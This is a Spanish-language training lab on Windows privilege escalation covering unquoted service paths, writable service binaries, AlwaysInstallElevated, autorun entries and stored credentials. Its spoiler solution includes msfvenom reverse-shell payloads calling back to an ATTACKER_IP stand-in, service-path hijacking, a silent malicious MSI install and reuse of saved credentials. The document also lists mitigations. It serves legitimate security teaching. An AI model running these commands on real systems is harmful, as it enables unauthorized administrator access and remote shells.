# 🪟 Lab 02: Escalada de Privilegios Windows

## Objetivo

Practicar técnicas de escalada de privilegios en Windows explotando configuraciones vulnerables.

## Escenario

Eres un atacante con acceso como usuario estándar (`lowuser`). Tu objetivo es escalar privilegios hasta Administrator.

## Entorno

- **Sistema:** Windows Server 2019 (contenedor)
- **Usuario inicial:** `lowuser` (contraseña: `Password123`)
- **Target:** Obtener acceso `Administrator`

## Vulnerabilidades Configuradas

| # | Vulnerabilidad | Categoría | Dificultad |
|---|----------------|-----------|------------|
| 1 | Unquoted Service Path | Services | ⭐ Fácil |
| 2 | Modificable Service Binary | Services | ⭐ Fácil |
| 3 | AlwaysInstallElevated | Registry | ⭐⭐ Media |
| 4 | Autorun Program | Registry | ⭐⭐ Media |
| 5 | Stored Credentials (CMDKey) | Credentials | ⭐⭐⭐ Difícil |

## Inicio Rápido

```bash
# Levantar el entorno
docker compose up -d

# Obtener shell (usando evil-winrm o rdp)
docker compose exec windows-lab cmd
```

## Instrucciones

### Paso 1: Enumeración Inicial

```powershell
# Verificar usuario y privilegios
whoami /priv
whoami /groups

# Verificar sistema
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Verificar software instalado
wmic product get name,version

# Verificar servicios
sc query state= all
```

### Paso 2: Explotar Vulnerabilidades

Sigue el orden de dificultad:

1. **Unquoted Path** → Revisa servicios con rutas sin comillas
2. **Modificable Service** → Busca servicios con permisos de escritura
3. **AlwaysInstallElevated** → Verifica el registro
4. **Autorun** → Busca programas de inicio
5. **Stored Credentials** → Usa `cmdkey /list`

### Paso 3: Obtener Administrator

```powershell
# Una vez explotada una vulnerabilidad
whoami  # Debería mostrar "nt authority\system" o "administrator"

# Leer la flag
type C:\Users\Administrator\Desktop\flag.txt
```

## Solución

<details>
<summary>🔍 Click para ver la solución (spoiler)</summary>

### Vulnerabilidad 1: Unquoted Service Path

```powershell
# Encontrar servicios con rutas sin comillas
wmic service get name,pathname | findstr /V "C:\Windows"

# Si encuentras: C:\Program Files\My Service\service.exe
# La ruta sin comillas es explotable
# Crear archivo en: C:\Program Files\My.exe

# Usar msfvenom para crear payload
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -f exe -o My.exe
```

### Vulnerabilidad 2: Modificable Service Binary

```powershell
# Verificar permisos de servicio
sc qc VulnService
sc showacl VulnService

# Si puedes modificar el binario
sc config VulnService binpath= "C:\temp\payload.exe"
sc stop VulnService
sc start VulnService
```

### Vulnerabilidad 3: AlwaysInstallElevated

```powershell
# Verificar registros
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si ambos son 1, crear MSI malicioso
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### Vulnerabilidad 4: Autorun Program

```powershell
# Verificar programas de inicio
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Si encuentras un programa en ruta modificable
# Reemplazar el binario con tu payload
```

### Vulnerabilidad 5: Stored Credentials

```powershell
# Listar credenciales almacenadas
cmdkey /list

# Si hay credenciales, usarlas
runas /user:admin /savecred cmd.exe
```

</details>

## Criterios de Éxito

- [ ] Obtener acceso Administrator o SYSTEM
- [ ] Leer `C:\Users\Administrator\Desktop\flag.txt`
- [ ] Documentar cada vulnerabilidad explotada
- [ ] Identificar al menos 3 técnicas de mitigación

## Mitigaciones

| Vulnerabilidad | Mitigación |
|----------------|------------|
| Unquoted Path | Usar rutas con comillas, eliminar servicios innecesarios |
| Modificable Service | Auditar permisos de servicios, principle of least privilege |
| AlwaysInstallElevated | Desactivar esta política, usar AppLocker |
| Autorun | Eliminar programas de inicio innecesarios |
| Stored Credentials | No usar /savecred, usar credenciales temporales |

## Limpieza

```bash
# Detener y eliminar el entorno
docker compose down -v --rmi all
```

---

*Lab creado para fines educativos — CyberDefense-Pro-Network*
